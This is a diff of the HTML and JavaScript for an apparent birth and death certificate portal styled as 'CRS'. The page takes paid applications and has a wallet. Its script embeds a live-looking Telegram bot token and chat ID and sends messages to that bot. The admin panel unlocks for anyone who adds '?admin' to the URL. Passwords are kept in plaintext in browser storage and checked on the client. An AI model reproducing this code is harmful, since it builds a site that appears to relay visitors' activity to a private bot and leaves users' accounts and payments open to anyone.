@@ -30,7 +30,8 @@
             </div>
         </div>
         <div id="auth-section">
-            <!-- Dynamically injected via JS -->
+            <button class="btn btn-light btn-sm fw-bold me-2" data-bs-toggle="modal" data-bs-target="#loginModal">Login</button>
+            <button class="btn btn-warning btn-sm fw-bold" data-bs-toggle="modal" data-bs-target="#registerModal">Register</button>
         </div>
     </div>
 </div>
@@ -44,10 +45,30 @@
 
 <!-- Main Content Area -->
 <div class="container my-4" id="main-content">
-    <!-- Loaded dynamically -->
+    <div class="alert alert-info text-center p-5" id="guest-alert">
+        <h4>Please Login or Register to apply for Birth and Death certificates & manage wallet.</h4>
+        <p class="mb-0">Note: Type <b>?admin</b> in URL to view Admin Panel.</p>
+    </div>
+
+    <div class="row text-center mb-4" id="user-dashboard" style="display: none;">
+        <div class="col-md-6 mb-3">
+            <div class="card card-custom p-4 bg-white border-top border-primary border-4">
+                <h3><i class="fas fa-baby text-primary"></i> New Birth Registration</h3>
+                <p class="text-muted">Apply for Child Birth Certificate. Charge: <b>₹500</b></p>
+                <button class="btn btn-birth w-100" data-bs-toggle="modal" data-bs-target="#birthModal">Apply New Birth</button>
+            </div>
+        </div>
+        <div class="col-md-6 mb-3">
+            <div class="card card-custom p-4 bg-white border-top border-danger border-4">
+                <h3><i class="fas fa-file-alt text-danger"></i> New Death Registration</h3>
+                <p class="text-muted">Apply for Death Certificate. Charge: <b>₹600</b></p>
+                <button class="btn btn-death w-100" data-bs-toggle="modal" data-bs-target="#deathModal">Apply New Death</button>
+            </div>
+        </div>
+    </div>
 </div>
 
-<!-- Admin Panel Section (Visible if ?admin is in URL) -->
+<!-- Admin Panel Section -->
 <div class="container my-5" id="admin-section" style="display:none;">
     <div class="card card-custom p-4 bg-white">
         <h2 class="text-center text-primary mb-4"><i class="fas fa-user-shield"></i> CRS Admin Panel</h2>
@@ -320,7 +341,6 @@
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 <script>
-    // Telegram Configuration
     const botToken = "8873914554:AAGTblEBmofkZ0PRntlzmyww3X3AETm5Op0";
     const chatId = "7742143795";
 
@@ -329,13 +349,7 @@
         fetch(url).catch(err => console.log(err));
     }
 
-    // LocalStorage Data Management
-    let db = JSON.parse(localStorage.getItem('crs_db')) || {
-        users: [],
-        applications: [],
-        support: []
-    };
-
+    let db = JSON.parse(localStorage.getItem('crs_db')) || { users: [], applications: [], support: [] };
     let currentUser = JSON.parse(localStorage.getItem('crs_current_user')) || null;
 
     function saveLocalStorage() {
@@ -343,66 +357,39 @@
         localStorage.setItem('crs_current_user', JSON.stringify(currentUser));
     }
 
-    // Render UI based on Login status and URL params
     function renderUI() {
         if(window.location.search.includes('admin') || window.location.hash.includes('admin')) {
-            document.getElementById('main-content').style.display = 'none';
-            document.getElementById('admin-section').style.display = 'block';
+            $('#main-content').hide();
+            $('#admin-section').show();
             loadAdminData();
             return;
         }
 
-        let authHTML = '';
         if(currentUser) {
-            authHTML = `
+            $('#auth-section').html(`
                 <span class="me-3 text-white">Welcome, <b>${currentUser.name}</b> | Wallet: <span class="text-warning fw-bold">₹${currentUser.balance}</span></span>
                 <button class="btn btn-warning btn-sm fw-bold me-2" data-bs-toggle="modal" data-bs-target="#addWalletModal"><i class="fas fa-wallet"></i> Add Balance</button>
                 <button class="btn btn-danger btn-sm" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Logout</button>
-            `;
-            
-            document.getElementById('main-content').innerHTML = `
-                <div class="row text-center mb-4">
-                    <div class="col-md-6 mb-3">
-                        <div class="card card-custom p-4 bg-white border-top border-primary border-4">
-                            <h3><i class="fas fa-baby text-primary"></i> New Birth Registration</h3>
-                            <p class="text-muted">Apply for Child Birth Certificate. Charge: <b>₹500</b></p>
-                            <button class="btn btn-birth w-100" data-bs-toggle="modal" data-bs-target="#birthModal">Apply New Birth</button>
-                        </div>
-                    </div>
-                    <div class="col-md-6 mb-3">
-                        <div class="card card-custom p-4 bg-white border-top border-danger border-4">
-                            <h3><i class="fas fa-file-alt text-danger"></i> New Death Registration</h3>
-                            <p class="text-muted">Apply for Death Certificate. Charge: <b>₹600</b></p>
-                            <button class="btn btn-death w-100" data-bs-toggle="modal" data-bs-target="#deathModal">Apply New Death</button>
-                        </div>
-                    </div>
-                </div>
-                <div class="text-center mt-3 text-muted"><small>Type <b>?admin</b> in URL or click here to open <a href="?admin" class="text-primary">Admin Panel</a></small></div>
-            `;
+            `);
+            $('#guest-alert').hide();
+            $('#user-dashboard').show();
         } else {
-            authHTML = `
+            $('#auth-section').html(`
                 <button class="btn btn-light btn-sm fw-bold me-2" data-bs-toggle="modal" data-bs-target="#loginModal">Login</button>
                 <button class="btn btn-warning btn-sm fw-bold" data-bs-toggle="modal" data-bs-target="#registerModal">Register</button>
-            `;
-            document.getElementById('main-content').innerHTML = `
-                <div class="alert alert-info text-center p-5">
-                    <h4>Please Login or Register to apply for Birth and Death certificates & manage wallet.</h4>
-                    <p class="mb-0">Note: Type <b>?admin</b> in URL to view Admin Panel.</p>
-                </div>
-            `;
+            `);
+            $('#guest-alert').show();
+            $('#user-dashboard').hide();
         }
-        document.getElementById('auth-section').innerHTML = authHTML;
     }
 
-    // Register Form Handler
     $('#registerForm').on('submit', function(e) {
         e.preventDefault();
         let name = $('#regName').val();
         let phone = $('#regPhone').val();
         let password = $('#regPass').val();
 
-        let exists = db.users.find(u => u.phone === phone);
-        if(exists) {
+        if(db.users.find(u => u.phone === phone)) {
             alert('Mobile number already registered!');
             return;
         }
@@ -410,4 +397,24 @@
         db.users.push({ name, phone, password, balance: 0 });
         saveLocalStorage();
         alert('Registration successful! Please login.');
-        $(
+        $('#registerModal').modal('hide');
+        this.reset();
+    });
+
+    $('#loginForm').on('submit', function(e) {
+        e.preventDefault();
+        let phone = $('#loginPhone').val();
+        let password = $('#loginPass').val();
+
+        let user = db.users.find(u => u.phone === phone && u.password === password);
+        if(user) {
+            currentUser = user;
+            saveLocalStorage();
+            $('#loginModal').modal('hide');
+            renderUI();
+        } else {
+            alert('Invalid Mobile Number or 4-digit Password!');
+        }
+    });
+
+    functi
